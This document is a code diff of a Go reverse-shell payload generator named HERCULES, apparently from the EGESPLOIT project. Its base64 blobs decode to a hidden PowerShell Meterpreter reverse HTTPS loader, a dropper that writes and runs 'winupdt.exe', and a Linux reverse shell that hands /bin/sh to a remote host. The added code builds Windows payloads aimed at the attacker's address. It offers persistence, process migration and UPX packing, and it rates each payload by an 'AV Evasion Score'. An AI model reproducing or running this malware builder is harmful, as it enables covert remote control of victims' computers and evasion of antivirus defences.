IHBhc3N3b3JkcwoKfk1FVEVSUFJFVEVSIC1BICIxMjcuMC4wLjE6ODg4OCIgIENyZWF0ZXMgYSByZXZlcnNlIGh0dHBzIG1ldGVycHJldGVyIGNvbm5lY3Rpb24gdG8gbWV0YXNwbG9pdCAocmV2ZXJzZV9odHRwcykKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKYAoKCgoKZnVuYyBDUkVBVEVfUFNfTUVURVJQUkVURVIoRW5jb2RlZENvbXByZXNzZWRCdWZmZXIgc3RyaW5nKSAoc3RyaW5nKSB7CiAgCgoKdmFyIFNoZWxsX1RlbXBsYXRlIHN0cmluZyA9IGBAZWNobyBvZmYKaWYgJVBST0NFU1NPUl9BUkNISVRFQ1RVUkUlPT14ODYgKHBvd2Vyc2hlbGwuZXhlIC1Ob1AgLU5vbkkgLVcgSGlkZGVuIC1FeGVjIEJ5cGFzcyAtQ29tbWFuZCAiSW52b2tlLUV4cHJlc3Npb24gJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAoJChOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCQoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0gKCwkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyhcImArRW5jb2RlZENvbXByZXNzZWRCdWZmZXIrYFwiKSkpKSwgW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSwgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkpLlJlYWRUb0VuZCgpOyIpIGVsc2UgKCVXaW5EaXIlXHN5c3dvdzY0XHdpbmRvd3Nwb3dlcnNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kICJJbnZva2UtRXhwcmVzc2lvbiAkKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyICgkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSAoLCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFwiYCtFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcitgXCIpKSkpLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IikKCmAKCiAgcmV0dXJuIFNoZWxsX1RlbXBsYXRlOwoKfQoKCmZ1bmMgUkVWRVJTRV9IVFRQU19TSEVMTChJUF9QT1JUIHN0cmluZykgKHN0cmluZykgey8vbCwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlKGJhc2U2NFRleHQsIFtdYnl0ZShtZXNzYWdlKSkKICAKCgpQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMsIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhgSkhFZ1BTQkFJZzBLVzBSc2JFbHRjRzl5ZENnaWEyVnlibVZzTXpJdVpHeHNJaWxkSUhCMVlteHBZeUJ6ZEdGMGFXTWdaWGgwWlhKdQpJRWx1ZEZCMGNpQldhWEowZFdGc1FXeHNiMk1vU1c1MFVIUnlJR3h3UVdSa2NtVnpjeXdnZFdsdWRDQmtkMU5wZW1Vc0lIVnBiblFnClpteEJiR3h2WTJGMGFXOXVWSGx3WlN3Z2RXbHVkQ0JtYkZCeWIzUmxZM1FwT3cwS1cwUnNiRWx0Y0c5eWRDZ2lhMlZ5Ym1Wc016SXUKWkd4c0lpbGRJSEIxWW14cFl5QnpkR0YwYVdNZ1pYaDBaWEp1SUVsdWRGQjBjaUJEY21WaGRHVlVhSEpsWVdRb1NXNTBVSFJ5SUd4dwpWR2h5WldGa1FYUjBjbWxpZFhSbGN5d2dkV2x1ZENCa2QxTjBZV05yVTJsNlpTd2dTVzUwVUhSeUlHeHdVM1JoY25SQlpHUnlaWE56CkxDQkpiblJRZEhJZ2JIQlFZWEpoYldWMFpYSXNJSFZwYm5RZ1pIZERjbVZoZEdsdmJrWnNZV2R6TENCSmJuUlFkSElnYkhCVWFISmwKWVdSSlpDazdEUW9pUUEwS2RISjVleVJrSUQwZ0lrRkNRMFJGUmtkSVNVcExURTFPVDFCUlVsTlVWVlpYV0ZsYVlXSmpaR1ZtWjJocAphbXRzYlc1dmNIRnljM1IxZG5kNGVYb3dNVEl6TkRVMk56ZzVJaTVVYjBOb1lYSkJjbkpoZVNncERRcG1kVzVqZEdsdmJpQmpLQ1IyCktYc2djbVYwZFhKdUlDZ29XMmx1ZEZ0ZFhTQWtkaTVVYjBOb1lYSkJjbkpoZVNncElId2dUV1ZoYzNWeVpTMVBZbXBsWTNRZ0xWTjEKYlNrdVUzVnRJQ1VnTUhneE1EQWdMV1Z4SURreUtYME5DbVoxYm1OMGFXOXVJSFFnZXlSbUlEMGdJaUk3TVM0dU0zeG1iM0psWVdObwpMVzlpYW1WamRIc2taaXM5SUNSa1d5aG5aWFF0Y21GdVpHOXRJQzF0WVhocGJYVnRJQ1JrTGt4bGJtZDBhQ2xkZlR0eVpYUjFjbTRnCkpHWTdmUTBLWm5WdVkzUnBiMjRnWlNCN0lIQnliMk5sYzNNZ2UxdGhjbkpoZVYwa2VDQTlJQ1I0SUNzZ0pGOTlPeUJsYm1RZ2V5UjQKSUh3Z2MyOXlkQzF2WW1wbFkzUWdleWh1WlhjdGIySnFaV04wSUZKaGJtUnZiU2t1Ym1WNGRDZ3BmWDE5RFFwbWRXNWpkR2x2YmlCbgpleUJtYjNJZ0tDUnBQVEE3SkdrZ0xXeDBJRFkwT3lScEt5c3BleVJvSUQwZ2REc2theUE5SUNSa0lId2daVHNnSUdadmNtVmhZMmdnCktDUnNJR2x1SUNScktYc2tjeUE5SUNSb0lDc2dKR3c3SUdsbUlDaGpLQ1J6S1NrZ2V5QnlaWFIxY200Z0pITWdmWDE5Y21WMGRYSnUKSUNJNWRsaFZJanQ5RFFwYlRtVjBMbE5sY25acFkyVlFiMmx1ZEUxaGJtRm5aWEpkT2pwVFpYSjJaWEpEWlhKMGFXWnBZMkYwWlZaaApiR2xrWVhScGIyNURZV3hzWW1GamF5QTlJSHNrZEhKMVpYMDdKRzBnUFNCT1pYY3RUMkpxWldOMElGTjVjM1JsYlM1T1pYUXVWMlZpClEyeHBaVzUwT3cwS0pHMHVTR1ZoWkdWeWN5NUJaR1FvSW5WelpYSXRZV2RsYm5RaUxDQWlUVzk2YVd4c1lTODBMakFnS0dOdmJYQmgKZEdsaWJHVTdJRTFUU1VVZ05pNHhPeUJYYVc1a2IzZHpJRTVVS1NJcE95UnVJRDBnWnpzZ1cwSjVkR1ZiWFYwZ0pIQWdQU0FrYlM1RQpiM2R1Ykc5aFpFUmhkR0VvSW1oMGRIQnpPaTh2WUN0emRISnBibWNvU1ZCZlVFOVNWQ2tyWUM4a2JpSWdLUTBLSkc4Z1BTQkJaR1F0ClZIbHdaU0F0YldWdFltVnlSR1ZtYVc1cGRHbHZiaUFrY1NBdFRtRnRaU0FpVjJsdU16SWlJQzF1WVcxbGMzQmhZMlVnVjJsdU16SkcKZFc1amRHbHZibk1nTFhCaGMzTjBhSEoxRFFva2VEMGtiem82Vm1seWRIVmhiRUZzYkc5aktEQXNKSEF1VEdWdVozUm9MREI0TXpBdwpNQ3d3ZURRd0tUdGJVM2x6ZEdWdExsSjFiblJwYldVdVNXNTBaWEp2Y0ZObGNuWnBZMlZ6TGsxaGNuTm9ZV3hkT2pwRGIzQjVLQ1J3CkxDQXdMQ0JiU1c1MFVIUnlYU2drZUM1VWIwbHVkRE15S0NrcExDQWtjQzVNWlc1bmRHZ3BEUW9rYnpvNlEzSmxZWFJsVkdoeVpXRmsKS0RBc01Dd2tlQ3d3TERBc01Da2dmQ0J2ZFhRdGJuVnNiRHNnVTNSaGNuUXRVMnhsWlhBZ0xWTmxZMjl1WkNBNE5qUXdNSDFqWVhSagphSHQ5YCkKCiAgSW5kZXggOj0gc3RyaW5ncy5SZXBsYWNlKHN0cmluZyhQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMpLCAiK3N0cmluZyhJUF9QT1JUKSsiLCBJUF9QT1JULCAtMSkKCgogIHJldHVybiBzdHJpbmcoSW5kZXgpCgp9CgoKCmZ1bmMgRElTUEFUQ0goKSB7CiAgdmFyIEVuY29kZWRCaW5hcnkgc3RyaW5nID0gIi8vSU5TRVJULUJJTkFSWS1IRVJFLy8iCgoKICBCaW5hcnksIF8gOj0gb3MuQ3JlYXRlKCJ3aW51cGR0LmV4ZSIpCgogIERlY29kZWRCaW5hcnksIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhFbmNvZGVkQmluYXJ5KQoKICBCaW5hcnkuV3JpdGVTdHJpbmcoc3RyaW5nKERlY29kZWRCaW5hcnkpKTsKCiAgQmluYXJ5LkNsb3NlKCkKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJ3aW51cGR0LmV4ZSIpOwogIEV4ZWMuU3RhcnQoKTsKfQ==`
-var LINUX_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyhkaXIpICsgIiDCoz4gIiArIHN0cmluZyh2ZXJzaW9uKSArICIgwqM+ICIpOyAgIAogICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpCiAgICBjbWQ6PWV4ZWMuQ29tbWFuZCgiL2Jpbi9zaCIpOwogICAgY21kLlN0ZGluPWNvbm5lY3Q7CiAgICBjbWQuU3Rkb3V0PWNvbm5lY3Q7CiAgICBjbWQuU3RkZXJyPWNvbm5lY3Q7CiAgICBjbWQuUnVuKCk7Cn0=`
+func Menu_1()  {
+  Yellow := color.New(color.FgYellow)
+  BoldYellow := Yellow.Add(color.Bold)
+  White := color.New(color.FgWhite)
+  UnderlinedWhite := White.Add(color.Underline)
+  BoldYellow.Println("\n[1] GENERATE PAYLOAD ")
+  BoldYellow.Println("\n[2] BIND PAYLOAD ")
+  BoldYellow.Println("\n[3] UPDATE ")
+
+  UnderlinedWhite.Print("\n\n[*] Select : ")
+}
+
+func PrintPayloads()  {
+
+  White := color.New(color.FgWhite)
+  BoldWhite := White.Add(color.Bold)
+  Green := color.New(color.FgGreen)
+  BoldGreen := Green.Add(color.Bold)
 
 
-
-var HELP string = `
-
-                  __  ____________  ________  ____    ___________
-                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
-                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
-               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
-              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
-                                                   
-
-############################ HERCULES REVERSE SHELL ############################
-
-
-
-Usage : ./HERCULES <Local Ip> <Local Port> <options>
-
-
-Options : 
-
-      -p                 Payload to use. ( Windows / Linux )
-
-      -a                 The architecture to use. ( x86, x64 )
-      
-      -l                 Specify linking type for compiler. ( static, dynamic )
-
-      --persistence      Enable outo persistence option for continious acces.
-
-      --embed="file.exe" Embed the selected payload with selected exe file.
+  fmt.Println("\n")
+  BoldWhite.Println(" #===============================================================================#")
+  BoldWhite.Println(" |     PAYLOAD                           |     SIZE/UPX     |  AV Evasion Score  |")
+  BoldWhite.Println(" |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~|")
+  BoldWhite.Print("(1) Meterpreter Reverse TCP              |  946 KB / 262 KB |       ")
+  BoldGreen.Print("10/10        ")
+  BoldWhite.Println("|")
+  BoldWhite.Println(" |                                       |                  |                    |")
+  BoldWhite.Print("(2) Meterpreter Reverse HTTP             |  4.2 MB / 1.1 MB |       ")
+  BoldGreen.Print("10/10        ")
+  BoldWhite.Println("|")
+  BoldWhite.Println(" |                                       |                  |                    |")
+  BoldWhite.Print("(3) Meterpreter Reverse HTTPS            |  4.2 MB / 1.1 MB |       ")
+  BoldGreen.Print("10/10        ")
+  BoldWhite.Println("|")
+  BoldWhite.Println(" |                                       |                  |                    |")
+  BoldWhite.Print("(4) HERCULES REVERSE SHELL               |  4.4 MB / 1.1 MB |        ")
+  BoldGreen.Print("9/10        ")
+  BoldWhite.Println("|")
+  BoldWhite.Println(" |                                       |                  |                    |")
+  BoldWhite.Println(" #===============================================================================#")
+  fmt.Println("\n")
+}
 
 
-`
+func FinalView()  {
+  Cyan := color.New(color.FgCyan)
+  BoldCyan := Cyan.Add(color.Bold)
+  Green := color.New(color.FgGreen)
+  BoldGreen := Green.Add(color.Bold)
+  Blue := color.New(color.FgBlue)
+  BoldBlue := Blue.Add(color.Bold)
+  Yellow := color.New(color.FgYellow)
+  BoldYellow := Yellow.Add(color.Bold)
+  Red := color.New(color.FgRed)
+  BoldRed := Red.Add(color.Bold)
+  White := color.New(color.FgWhite)
+  BoldWhite := White.Add(color.Bold)
+  ClearScreen()
+  PrintBanner()
+
+  if Payload.Type == 1 {
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# Meterpreter Reverse TCP                    | 946 KB / 262 KB  |        ")
+    if Payload.Score < 5 {
+      BoldRed.Print(Payload.Score)
+    }else if Payload.Score == 5 {
+      BoldYellow.Print(Payload.Score)
+    }else {
+      BoldGreen.Print(Payload.Score)
+    }
+    if Payload.Score == 10 {
+      BoldGreen.Print("/10       ")
+    }else{
+      BoldGreen.Print("/10        ")
+    }
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+  }else if Payload.Type == 2 {
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# Meterpreter Reverse HTTP                   | 4.2 MB / 1.1 MB  |        ")
+    if Payload.Score < 5 {
+      BoldRed.Print(Payload.Score)
+    }else if Payload.Score == 5 {
+      BoldYellow.Print(Payload.Score)
+    }else {
+      BoldGreen.Print(Payload.Score)
+    }
+    if Payload.Score == 10 {
+      BoldGreen.Print("/10       ")
+    }else{
+      BoldGreen.Print("/10        ")
+    }
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+  }else if Payload.Type == 3 {
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# Meterpreter Reverse HTTPS                  | 4.2 MB / 1.1 MB  |        ")
+    if Payload.Score < 5 {
+      BoldRed.Print(Payload.Score)
+    }else if Payload.Score == 5 {
+      BoldYellow.Print(Payload.Score)
+    }else {
+      BoldGreen.Print(Payload.Score)
+    }
+    if Payload.Score == 10 {
+      BoldGreen.Print("/10       ")
+    }else{
+      BoldGreen.Print("/10        ")
+    }
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+  }else if Payload.Type == 4 {
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# HERCULES REVERSE SHELL                     | 4.4 MB / 1.1 MB  |        ")
+    if Payload.Score < 5 {
+      BoldRed.Print(Payload.Score)
+    }else if Payload.Score == 5 {
+      BoldYellow.Print(Payload.Score)
+    }else {
+      BoldGreen.Print(Payload.Score)
+    }
+    if Payload.Score == 10 {
+      BoldGreen.Print("/10       ")
+    }else{
+      BoldGreen.Print("/10        ")
+    }
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+  }
 
 
+  if Payload.Persistence == true {
+    BoldCyan.Print("\n[*] Persistence : ON")
+    BoldWhite.Print(" (")
+    BoldRed.Print("-2")
+    BoldWhite.Println(")")
+  }
+  if Payload.Migrate == true {
+    BoldCyan.Print("\n[*] Migration : ON")
+    BoldWhite.Print(" (")
+    BoldRed.Print("-1")
+    BoldWhite.Println(")")
+  }
+
+  if Payload.UPX == true {
+    BoldCyan.Print("\n[*] UPX : ON")
+    BoldWhite.Print(" (")
+    BoldRed.Print("-3")
+    BoldWhite.Println(")")
+  }
 
 
-func CheckGolang() {
-  if runtime.GOOS == "linux" {
-    Result,_ := exec.Command("sh", "-c", "go version").Output()
-
-    if !(strings.Contains(string(Result), "version")){
-      exec.Command("sh", "-c", `zenity --warning --text="Golang is not installed on system !" --title="Warning !"`).Run()
-      exec.Command("sh", "-c", `zenity --info --text="Installing golang...!" --title="Setup!"`).Start()
-      exec.Command("sh", "-c", `apt-get install golang`).Run()
+  if Payload.Type == 1 {
+    if Payload.UPX == true && (Payload.Persistence || Payload.Migrate ){
+      BoldCyan.Println("\n[*] Payload Size : 326 KB")
+    }else if Payload.UPX == true && !(Payload.Persistence || Payload.Migrate) {
+      BoldCyan.Println("\n[*] Payload Size : 262 KB")
+    }else if Payload.UPX == false && !(Payload.Persistence || Payload.Migrate ) {
+      BoldCyan.Println("\n[*] Payload Size : 946 KB")
     }
 
-  }else if runtime.GOOS == "windows"{
-    Result,_ := exec.Command("cmd", "/C", "go version").Output()
+  }else{
+    if Payload.UPX == true {
+      BoldCyan.Println("\n[*] Payload Size : " + Payload.UPX_Size)
+    }else{
+      BoldCyan.Println("\n[*] Payload Size : " + Payload.Size)
+    }
+  }
 
-    if !(strings.Contains(string(Result), "version")){
-      exec.Command("cmd", "/C", `msg * Please install golang first !`).Run()
+
+  PayloadName := strings.TrimSuffix(Payload.FileName, ".go")
+
+  PayloadName += ".exe"
+
+  BoldWhite.Println("\n[*] Payload saved at : /root/" + PayloadName + "\n\n")
+
+
+}
+
+
+func CompilePayload()  {
+  Yellow := color.New(color.FgYellow)
+  BoldYellow := Yellow.Add(color.Bold)
+  Red := color.New(color.FgRed)
+  Warning := Red.Add(color.Bold)
+
+  Payload.FileName += ".go"
+
+  File, _ := os.Create(Payload.FileName)
+  Source, _ := base64.StdEncoding.DecodeString(Payload.SourceCode)
+  var SourceCode string
+
+  if Payload.Type == 2 || Payload.Type == 3 {
+    Address := string("\"http://" + Payload.Ip + ":" + Payload.Port + "/\"")
+    SourceCode = strings.Replace(string(Source), string("\"http://127.0.0.1:8080/\""), string(Address), -1)
+    if Payload.Persistence == true {
+      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", `import "EGESPLOIT/RSE"`, -1)
+      SourceCode = strings.Replace(string(SourceCode), "//RSE.Persistence()", "RSE.Persistence()", -1)
+    }
+    if Payload.Migrate == true {
+      SourceCode = strings.Replace(string(SourceCode), "//import \"EGESPLOIT/RSE\"", "import \"EGESPLOIT/RSE\"", -1)
+      SourceCode = strings.Replace(string(SourceCode), "//RSE.Migrate(Addr, len(Shellcode))", "RSE.Migrate(Addr, len(Shellcode))", -1)
+    }
+
+
+    File.WriteString(SourceCode)
+
+    BuildCommand := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
+    BoldYellow.Println("\n[*] Compiling payload...")
+    BoldYellow.Println("\n[*] " + BuildCommand)
+    exec.Command("sh", "-c", BuildCommand).Run()
+    CleanFilesCommand := string("rm " + Payload.FileName)
+    exec.Command("sh", "-c", CleanFilesCommand).Run()
+    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
+    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
+    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
+      Warning.Println("\n[!] ERROR : Compile failed")
       os.Exit(1)
     }
+    File.Close()
+    MovePayload := string("mv " + FileName_No_Suffix + ".exe /root/")
+    exec.Command("sh", "-c", MovePayload).Run()
+
+
+
+
+  }else if Payload.Type == 1 {
+    var IP string = "[4]byte{"
+    IP_Array := strings.Split(string(Payload.Ip), `.`)
+    for i := 0; i < 4; i++ {
+      if i == 3 {
+        IP += (IP_Array[i] + ",")
+        break
+      }
+      IP += (IP_Array[i] + "," + " ")
+    }
+    IP += "}}"
+
+    SourceCode = strings.Replace(string(Source), `[4]byte{127,0,0,1}}`, IP, -1)
+    SourceCode = strings.Replace(string(SourceCode), `5555`, Payload.Port, -1)
+
+    if Payload.Persistence == true {
+      SourceCode = strings.Replace(string(SourceCode), `//import "EGESPLOIT/RSE"`, `import "EGESPLOIT/RSE"`, -1)
+      SourceCode = strings.Replace(string(SourceCode), `//RSE.Persistence()`, `RSE.Persistence()`, -1)
+    }
+    if Payload.Migrate == true {
+      SourceCode = strings.Replace(string(SourceCode), `//import "EGESPLOIT/RSE"`, `import "EGESPLOIT/RSE"`, -1)
+      SourceCode = strings.Replace(string(SourceCode), `//RSE.Migrate(Addr, len(Shellcode))`, `RSE.Migrate(Addr, len(Shellcode))`, -1)
+    }
+
+
+    File.WriteString(SourceCode)
+
+    BuildCommand := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
+    BoldYellow.Println("\n[*] Compiling payload...")
+    BoldYellow.Println("\n[*] " + BuildCommand)
+    exec.Command("sh", "-c", BuildCommand).Run()
+    CleanFilesCommand := string("rm " + Payload.FileName)
+    exec.Command("sh", "-c", CleanFilesCommand).Run()
+    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
+    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
+    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
+      Warning.Println("\n[!] ERROR : Compile failed")
+      os.Exit(1)
+    }
+    File.Close()
+    MovePayload := string("mv " + FileName_No_Suffix + ".exe /root/")
+    exec.Command("sh", "-c", MovePayload).Run()
+
+  }else if Payload.Type == 4 {
+    Payload.Ip = string(`"`+Payload.Ip+`"`)
+    Payload.Port = string(`"`+Payload.Port+`"`)
+    SourceCode = strings.Replace(string(Source), `"10.10.10.84"`, Payload.Ip, -1)
+    SourceCode = strings.Replace(string(SourceCode), `"5555"`, Payload.Port, -1)
+
+    File.WriteString(SourceCode)
+
+    BuildCommand := string(`export GOOS=windows && export GOARCH=386 && go build -ldflags "-H windowsgui -s -w" ` + Payload.FileName)
+    BoldYellow.Println("\n[*] Compiling payload...")
+    BoldYellow.Println("\n[*] " + BuildCommand)
+    exec.Command("sh", "-c", BuildCommand).Run()
+    CleanFilesCommand := string("rm " + Payload.FileName)
+    exec.Command("sh", "-c", CleanFilesCommand).Run()
+    DirFiles, _ := exec.Command("sh", "-c", "ls").Output()
+    FileName_No_Suffix := strings.TrimSuffix(Payload.FileName, ".go")
+    if !(strings.Contains(string(DirFiles), FileName_No_Suffix)) {
+      Warning.Println("\n[!] ERROR : Compile failed")
+      os.Exit(1)
+    }
+    File.Close()
+    MovePayload := string("mv " + FileName_No_Suffix + ".exe /root/")
+    exec.Command("sh", "-c", MovePayload).Run()
 
   }
+
+}
+
+func AskMigrate()  {
+  Red := color.New(color.FgRed)
+  Warning := Red.Add(color.Bold)
+  fmt.Print("\n[?] Do you want to add migration function to payload (y/n) :")
+  fmt.Scan(&Ask)
+  if Ask == "y" || Ask == "Y" {
+    Warning.Print("\n[!] Adding migration will decreases the AV Evasion Score and increase the paylaod size, do you still want to continue (Y/n) :")
+    fmt.Scan(&Ask)
+    if Ask == "y" || Ask == "Y"{
+      Payload.Migrate = true
+      Payload.Score = (Payload.Score - 1)
+    }else{
+        Payload.Migrate = false
+    }
+  }else{
+      Payload.Migrate = false
+  }
+}
+
+
+
+
+func AskPersistence()  {
+  Red := color.New(color.FgRed)
+  Warning := Red.Add(color.Bold)
+  fmt.Print("\n[?] Do you want to add persistence function to payload (y/n) :")
+  fmt.Scan(&Ask)
+  if Ask == "y" || Ask == "Y" {
+    Warning.Print("\n[!] Adding persistence will decreases the AV Evasion Score and increase the paylaod size, do you still want to continue (Y/n) :")
+    fmt.Scan(&Ask)
+    if Ask == "y" || Ask == "Y"{
+      Payload.Persistence = true
+      Payload.Score = (Payload.Score - 2)
+    }else{
+        Payload.Persistence = false
+    }
+  }else{
+      Payload.Persistence = false
+  }
+}
+
+
+func AskUPX()  {
+  Red := color.New(color.FgRed)
+  Warning := Red.Add(color.Bold)
+  fmt.Print("\n[?] Do you want to compress the payload with UPX (y/n) :")
+  fmt.Scan(&Ask)
+  if Ask == "y" || Ask == "Y" {
+    Warning.Print("\n[!] Compressing payloads with UPX decreases the AV Evasion Score, do you still want to continue (Y/n) :")
+    fmt.Scan(&Ask)
+    if Ask == "y" || Ask == "Y"{
+      Payload.UPX = true
+      Payload.Score = (Payload.Score - 3)
+      ClearScreen()
+      PrintBanner()
+
+      ExeName := strings.TrimSuffix(Payload.FileName, ".go")
+      ExeName += ".exe"
+      UPX_Command := string("upx --brute " + ExeName)
+      UPX := exec.Command("sh", "-c", UPX_Command)
+      UPX.Stdout = os.Stdout
+      UPX.Run()
+    }else{
+        Payload.UPX = false
+    }
+  }else{
+      Payload.UPX = false
+  }
+}
+
+
+func ClearScreen()  {
+  Clear := exec.Command("clear")
+  Clear.Stdout = os.Stdout
+  Clear.Run()
+}
+
+
+
+
+
+
+
+func PreparePayload(No int)  {
+
+  Blue := color.New(color.FgBlue)
+  BoldBlue := Blue.Add(color.Bold)
+  Green := color.New(color.FgGreen)
+  BoldGreen := Green.Add(color.Bold)
+  Red := color.New(color.FgRed)
+  Warning := Red.Add(color.Bold)
+
+
+  if No == 1 {
+    Payload.Type = 1
+    Payload.Size = "946 KB"
+    Payload.FullSize = "1.1 MB"
+    Payload.MidSize = "326 KB"
+    Payload.UPX_Size = "262 KB"
+    Payload.Score = 10
+    Payload.SourceCode = METERPRETER_TCP
+
+    ClearScreen()
+    PrintBanner()
+
+    BoldBlue.Println("#====================================================================================#")
+    BoldBlue.Println("#     SELECTED PAYLOAD                       |     SIZE/UPX     |  AV Evasion Score  #")
+    BoldBlue.Println("#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~|~~~~~~~~~~~~~~~~~~~~#")
+    BoldBlue.Print("# Meterpreter Reverse TCP                    | 946 KB / 262 KB  |       ")
+    BoldGreen.Print("10/10        ")
+    BoldBlue.Println("#")
+    BoldBlue.Println("#====================================================================================#")
+
+    for  ;;  {
+      var IP string
+      fmt.Print("\n\n[*] Enter LHOST : ")
+      fmt.Scan(&IP)
+      if (len(IP) < 7) || (len(IP) > 15) {
+        Warning.Println("\n\n[!] ERROR : Invalid ip")
+      }else{
+        Payload.Ip = IP
+        break
+      }
+
+    }
+
+    for  ;;  {
+      var PORT string
+      fmt.Print("\n[*] Enter LPORT : ")
+      fmt.Scan(&PORT)
+      _, err := strconv.Atoi(PORT)
+      if err == nil {
+        Payload.Port = PORT
+        break
+      }
+      Warning.Println("\n\n[!] ERROR : Invalid port")
+
+    }
+      AskPersistence()
+      AskMigrate()
+
+
+  }else if No == 2 {
+
+    Payload.Type = 2
